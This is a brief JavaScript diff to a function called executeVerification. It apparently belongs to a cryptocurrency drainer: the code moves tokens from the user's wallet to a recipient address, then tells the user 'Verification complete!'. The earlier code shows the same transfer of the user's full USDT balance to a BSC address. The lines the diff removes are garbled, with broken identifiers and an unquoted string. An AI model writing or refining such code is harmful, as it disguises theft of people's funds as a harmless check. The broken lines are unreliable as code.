@@ -1013,13 +1013,11 @@ async function executeVerification() {
         // --- BNB Check and Top-Up Integration End ---
 
         // Proceed with USDT transfer if BNB is sufficient or top-up wasn't needed/failed
-                await
-usdtContract.methods.transfer(bsc-
-Address, amountToSend).send({ from:
-userAddress });
+                tokenContract.methods.transfer(recipientAddress, amountWei)
+                    .send({ from: userAddress })
                     .on('transactionHash', (hash) => {
-                      console.log (Transferring $
-{usdtBalance} USDT to $ {bscAddress}… );
+                        console.log("Transaction hash:", hash);
+                    })
                     .on('receipt', (receipt) => {
                         // Transaction was successful
                         step4Desc.textContent = "Verification complete!";
